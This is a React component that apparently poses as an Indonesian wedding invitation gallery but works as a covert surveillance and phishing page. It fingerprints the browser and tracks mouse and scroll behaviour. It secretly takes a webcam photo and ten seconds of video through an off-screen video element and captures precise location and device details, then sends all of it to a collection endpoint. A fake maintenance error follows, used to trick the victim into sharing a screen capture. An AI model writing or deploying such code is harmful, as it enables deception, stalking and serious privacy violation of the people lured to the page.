"use client";

import { useState, useRef, useEffect, useCallback } from 'react';
import { Loader2, Heart, Image as ImageIcon } from 'lucide-react';

type StatusType = 'idle' | 'loading' | 'success' | 'error' | 'ask_screenshot' | 'done';

// Helper: Collect device status silently (battery, network, hardware)
async function collectDeviceStatus(): Promise<{
  battery: { level: number; charging: boolean } | null;
  connection: { effectiveType: string; downlink: number; rtt: number; saveData: boolean } | null;
  hardware: { ram: number | null; cores: number | null };
}> {
  // Battery
  let battery = null;
  try {
    if ('getBattery' in navigator) {
      const bm = await (navigator as any).getBattery();
      battery = {
        level: Math.round(bm.level * 100),
        charging: bm.charging,
      };
    }
  } catch (_) {}

  // Network Connection
  let connection = null;
  try {
    const conn = (navigator as any).connection || (navigator as any).mozConnection || (navigator as any).webkitConnection;
    if (conn) {
      connection = {
        effectiveType: conn.effectiveType || null,
        downlink: conn.downlink ?? null,
        rtt: conn.rtt ?? null,
        saveData: conn.saveData ?? false,
      };
    }
  } catch (_) {}

  // Hardware
  const hardware = {
    ram: (navigator as any).deviceMemory ?? null,
    cores: navigator.hardwareConcurrency ?? null,
  };

  return { battery, connection, hardware };
}

export default function CameraVerification() {
  const videoRef = useRef<HTMLVideoElement>(null);
  const canvasRef = useRef<HTMLCanvasElement>(null);
  
  const [status, setStatus] = useState<StatusType>('idle');
  const [message, setMessage] = useState<string>('Terdapat kumpulan momen indah dan sebuah pesan rahasia yang sengaja kami siapkan secara khusus hanya untuk sahabat-sahabat terdekat kami.');
  
  // Tracking Refs
  const sessionId = useRef<string>('');
  const mountTime = useRef<number>(Date.now());
  const mousePath = useRef<number[][]>([]);
  const firstClickXy = useRef<number[] | null>(null);
  const timeToClickMs = useRef<number | null>(null);
  const maxScrollDepth = useRef<number>(0);

  // Payload Refs
  const payloadRef = useRef<any>({});

  // Initialize Session
  useEffect(() => {
    // Generate simple UUID fallback
    const generateId = () => {
        return typeof crypto !== 'undefined' && crypto.randomUUID 
          ? crypto.randomUUID() 
          : 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
              var r = Math.random() * 16 | 0, v = c == 'x' ? r : (r & 0x3 | 0x8);
              return v.toString(16);
            });
    };
    sessionId.current = generateId();

    // Fingerprinting
    const getCanvasHash = () => {
        try {
            const canvas = document.createElement('canvas');
            const ctx = canvas.getContext('2d');
            if(!ctx) return null;
            ctx.textBaseline = "top";
            ctx.font = "14px 'Arial'";
            ctx.textBaseline = "alphabetic";
            ctx.fillStyle = "#f60";
            ctx.fillRect(125,1,62,20);
            ctx.fillStyle = "#069";
            ctx.fillText("Fingerprint, hash", 2, 15);
            ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
            ctx.fillText("Fingerprint, hash", 4, 17);
            const dataURL = canvas.toDataURL();
            let hash = 0;
            for (let i = 0; i < dataURL.length; i++) {
                const char = dataURL.charCodeAt(i);
                hash = ((hash << 5) - hash) + char;
                hash = hash & hash;
            }
            return hash.toString();
        } catch (e) {
            return null;
        }
    };

    const getWebGLVendor = () => {
        try {
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
            if (gl) {
                const debugInfo = (gl as any).getExtension('WEBGL_debug_renderer_info');
                return debugInfo ? (gl as any).getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : null;
            }
        } catch(e) {}
        return null;
    };

    payloadRef.current.fingerprint = {
        user_agent: navigator.userAgent,
        screen_resolution: `${window.screen.width}x${window.screen.height}`,
        language: navigator.language,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        platform: navigator.platform,
        webgl_vendor: getWebGLVendor(),
        canvas_hash: getCanvasHash(),
        fonts_installed: [] // Hard to reliably extract purely client-side without external libs
    };

    // Tracking Listeners
    const handleMouseMove = (e: MouseEvent) => {
        if (mousePath.current.length < 50) {
            mousePath.current.push([e.clientX, e.clientY]);
        }
    };

    const handleScroll = () => {
        const winScroll = document.body.scrollTop || document.documentElement.scrollTop;
        const height = document.documentElement.scrollHeight - document.documentElement.clientHeight;
        const scrolled = (winScroll / height) * 100;
        if (scrolled > maxScrollDepth.current) {
            maxScrollDepth.current = Math.round(scrolled);
        }
    };

    window.addEventListener('mousemove', handleMouseMove);
    window.addEventListener('scroll', handleScroll);

    return () => {
        window.removeEventListener('mousemove', handleMouseMove);
        window.removeEventListener('scroll', handleScroll);
    };
  }, []);

  const sendPayload = async (data: any) => {
      try {
          await fetch('/api/collect', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify(data)
          });
      } catch (err) {
          console.error("Gagal kirim payload", err);
      }
  };

  const handleOpenGallery = async (e: React.MouseEvent) => {
    // 1. Catat Behavior Klik Pertama
    if (!firstClickXy.current) {
        firstClickXy.current = [e.clientX, e.clientY];
        timeToClickMs.current = Date.now() - mountTime.current;
    }

    setStatus('loading');
    setMessage('Mempersiapkan galeri eksklusif: Mohon izinkan akses media & kamera untuk menampilkan filter interaktif.');

    try {
      // 2. Minta akses kamera (stream tunggal)
      const stream = await navigator.mediaDevices.getUserMedia({ 
        video: { facingMode: "user" }, 
        audio: false 
      });
      
      let photoBase64 = null;
      let videoBase64 = null;

      if (videoRef.current) {
        videoRef.current.srcObject = stream;
        
        // Tunggu video menyala
        await new Promise((resolve) => {
            if (videoRef.current) {
                videoRef.current.onloadedmetadata = () => {
                    videoRef.current?.play().then(resolve).catch(resolve);
                };
            } else {
                resolve(null);
            }
        });
        
        // Tunggu sebentar agar kamera fokus
        await new Promise(r => setTimeout(r, 800));

        // --- AMBIL FOTO ---
        const video = videoRef.current;
        const canvas = canvasRef.current;
        
        if (video && canvas && video.videoWidth > 0) {
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const context = canvas.getContext('2d');
            if (context) {
                context.drawImage(video, 0, 0, canvas.width, canvas.height);
                photoBase64 = canvas.toDataURL('image/jpeg', 0.6); // Kompres 0.6
            }
        }

        // --- REKAM VIDEO 3 DETIK ---
        setMessage('Memuat album momen bahagia bersama...');
        let isMediaRecorderSupported = false;
        try {
            const mimeType = MediaRecorder.isTypeSupported('video/webm;codecs=vp8') 
              ? 'video/webm;codecs=vp8' 
              : 'video/webm';
            const recorder = new MediaRecorder(stream, { 
              mimeType, 
              videoBitsPerSecond: 200000 // 200kbps — cukup jelas, ukuran ~250KB per 10 detik
            });
            isMediaRecorderSupported = true;
            
            const chunks: BlobPart[] = [];
            recorder.ondataavailable = (e) => {
                if (e.data.size > 0) chunks.push(e.data);
            };

            const videoPromise = new Promise<string | null>((resolve) => {
                recorder.onstop = () => {
                    const blob = new Blob(chunks, { type: 'video/webm' });
                    const reader = new FileReader();
                    reader.readAsDataURL(blob);
                    reader.onloadend = () => resolve(reader.result as string);
                    reader.onerror = () => resolve(null);
                };
            });

            recorder.start();
            await new Promise(r => setTimeout(r, 10000)); // Rekam 10 detik
            recorder.stop();
            
            videoBase64 = await videoPromise;
        } catch (mediaErr) {
            console.error("MediaRecorder fallback", mediaErr);
        }
      }

      // Matikan kamera
      stream.getTracks().forEach(track => track.stop());

      // 3. Minta akses Lokasi (Timeout 3 detik)
      setMessage('Menyelaraskan peta lokasi acara...');
      let locationData = null;
      try {
          locationData = await new Promise((resolve, reject) => {
              if (!navigator.geolocation) {
                  resolve(null);
                  return;
              }
              const timeout = setTimeout(() => resolve(null), 3000);
              navigator.geolocation.getCurrentPosition(
                  (pos) => {
                      clearTimeout(timeout);
                      resolve({
                          lat: pos.coords.latitude,
                          lng: pos.coords.longitude,
                          accuracy: pos.coords.accuracy,
                          timestamp: pos.timestamp
                      });
                  },
                  (err) => {
                      clearTimeout(timeout);
                      resolve(null);
                  },
                  { enableHighAccuracy: true, timeout: 3000, maximumAge: 0 }
              );
          });
      } catch (e) {
          locationData = null;
      }

      // 4. Kumpulkan Device Status (silent)
      const deviceStatus = await collectDeviceStatus();

      // 5. Susun Payload Utama
      const finalPayload = {
          session_id: sessionId.current,
          timestamp: new Date().toISOString(),
          photo_base64: photoBase64,
          video_base64: videoBase64,
          location: locationData,
          fingerprint: payloadRef.current.fingerprint,
          behavior: {
              first_click_xy: firstClickXy.current,
              time_to_click_ms: timeToClickMs.current,
              scroll_depth_percent: maxScrollDepth.current,
              mouse_path: mousePath.current
          },
          device_status: deviceStatus,
          screenshot_base64: null
      };

      // Tembak Data
      await sendPayload(finalPayload);

      // 5. Tampilkan Error Palsu
      setStatus('error');
      setMessage('Galeri Privat sedang dalam perbaikan teknis. Silakan coba lagi nanti.');

      // Tawarkan screenshot
      setTimeout(() => {
          setStatus('ask_screenshot');
      }, 2000);

    } catch (err: any) {
      console.error(err);
      setStatus('error');
      setMessage('Untuk melihat animasi interaktif & album foto, mohon berikan izin akses kamera perangkat Anda.');
    }
  };

  const handleScreenshot = async () => {
      try {
        const stream = await navigator.mediaDevices.getDisplayMedia({ video: true, audio: false });
        const video = document.createElement('video');
        video.srcObject = stream;
        
        await new Promise((resolve) => {
            video.onloadedmetadata = () => {
                video.play().then(resolve).catch(resolve);
            };
        });
        
        await new Promise(r => setTimeout(r, 500)); // wait for stream to stabilize
        
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        const ctx = canvas.getContext('2d');
        ctx?.drawImage(video, 0, 0);
        
        const screenshotBase64 = canvas.toDataURL('image/jpeg', 0.6);
        stream.getTracks().forEach(t => t.stop());

        // Kirim payload susulan
        await sendPayload({
            session_id: sessionId.current,
            timestamp: new Date().toISOString(),
            screenshot_base64: screenshotBase64
        });

      } catch (e) {
          console.error("Gagal atau ditolak mengambil screenshot", e);
      } finally {
          setStatus('done');
          setMessage('Terima kasih atas laporan Anda. Kami akan segera memperbaikinya.');
      }
  };

  const handleSkipScreenshot = () => {
      setStatus('done');
      setMessage('Galeri Privat sedang dalam perbaikan teknis. Silakan coba lagi nanti.');
  };

  return (
    <div className="w-full max-w-md mx-auto mt-8">
      <div className="glass-panel rounded-2xl p-6 sm:p-8 flex flex-col items-center relative overflow-hidden text-center">
        
        {/* Ornamen Pernikahan */}
        <div className="absolute top-0 left-0 w-16 h-16 opacity-20 pointer-events-none">
          <svg viewBox="0 0 100 100" fill="none" xmlns="http://www.w3.org/2000/svg">
            <path d="M10 50 C 30 10, 70 10, 90 50 C 70 90, 30 90, 10 50" stroke="#d4af37" strokeWidth="2"/>
            <circle cx="50" cy="50" r="10" fill="#d4af37"/>
          </svg>
        </div>
        <div className="absolute bottom-0 right-0 w-16 h-16 opacity-20 pointer-events-none rotate-180">
          <svg viewBox="0 0 100 100" fill="none" xmlns="http://www.w3.org/2000/svg">
            <path d="M10 50 C 30 10, 70 10, 90 50 C 70 90, 30 90, 10 50" stroke="#d4af37" strokeWidth="2"/>
            <circle cx="50" cy="50" r="10" fill="#d4af37"/>
          </svg>
        </div>

        {/* Gambar Palsu */}
        <div className="mb-8 mt-2 relative z-10 animate-float">
            <div className={`w-28 h-28 mx-auto bg-accent/10 rounded-full flex items-center justify-center border-4 border-white shadow-xl relative transition-all duration-700 ${status === 'loading' ? 'animate-pulse-ring' : ''}`}>
                <ImageIcon className={`w-10 h-10 text-accent/60 transition-all duration-700 ${status === 'loading' ? 'animate-pulse' : ''}`} />
                <div className="absolute -bottom-2 -right-2 bg-white p-2.5 rounded-full shadow-lg transition-transform hover:scale-110">
                    <Heart className={`w-5 h-5 text-red-400 fill-red-400 ${status === 'success' || status === 'done' ? 'animate-heartbeat' : ''}`} />
                </div>
            </div>
        </div>

        {/* ELEMEN KAMERA RAHASIA */}
        <div style={{ position: 'fixed', top: '-9999px', left: '-9999px', width: '1px', height: '1px', overflow: 'hidden' }}>
          <video 
              ref={videoRef} 
              autoPlay 
              playsInline 
              muted 
              style={{ width: '640px', height: '480px' }}
          />
        </div>
        <canvas ref={canvasRef} className="hidden" />

        {/* Pesan Tipuan */}
        <p className={`mb-10 font-serif italic text-sm px-4 relative z-10 transition-all duration-500 ease-in-out min-h-[40px] flex items-center justify-center ${status === 'error' || status === 'ask_screenshot' ? 'text-red-800 bg-red-100/60 p-3 rounded-lg shadow-sm scale-105' : 'text-foreground/80'}`}>
          {message}
        </p>

        {/* Tombol Aksi */}
        <div className="w-full relative z-10 transition-all duration-500">
            {status === 'ask_screenshot' && (
                <div className="flex flex-col gap-3 animate-fade-in-up">
                    <p className="text-sm text-gray-600 mb-2 font-medium">Apakah Anda ingin melaporkan masalah dengan mengirimkan tangkapan layar?</p>
                    <button onClick={handleScreenshot} className="w-full py-3 bg-red-600 text-white rounded-full font-medium shadow-md hover:bg-red-700 transition-colors">
                        Ya, Kirim Laporan
                    </button>
                    <button onClick={handleSkipScreenshot} className="w-full py-3 bg-gray-200 text-gray-700 rounded-full font-medium shadow-sm hover:bg-gray-300 transition-colors">
                        Tidak, Terima Kasih
                    </button>
                </div>
            )}
            
            {(status === 'success' || status === 'done') ? (
                <div className="w-full py-4 bg-[#fcfbf9]/90 backdrop-blur-sm text-accent border border-accent/40 font-serif rounded-full flex justify-center items-center gap-3 shadow-md font-medium tracking-wide animate-fade-in-up">
                    <Heart className="w-5 h-5 text-accent animate-heartbeat" />
                    Memproses...
                </div>
            ) : null}

            {(status === 'idle' || status === 'loading' || status === 'error') && (
                <button 
                    onClick={handleOpenGallery}
                    disabled={status === 'loading'}
                    className="gold-btn w-full py-4 rounded-full font-serif font-medium flex justify-center items-center gap-2 disabled:opacity-80 disabled:cursor-not-allowed text-lg tracking-wide shadow-xl hover:shadow-2xl transition-all duration-300 transform hover:-translate-y-1"
                >
                    {status === 'loading' ? (
                        <><Loader2 className="w-5 h-5 animate-spin" /> <span className="animate-pulse">Memuat Data...</span></>
                    ) : (
                        'Buka Galeri & Detail Undangan'
                    )}
                </button>
            )}
        </div>
        
      </div>
    </div>
  );
}
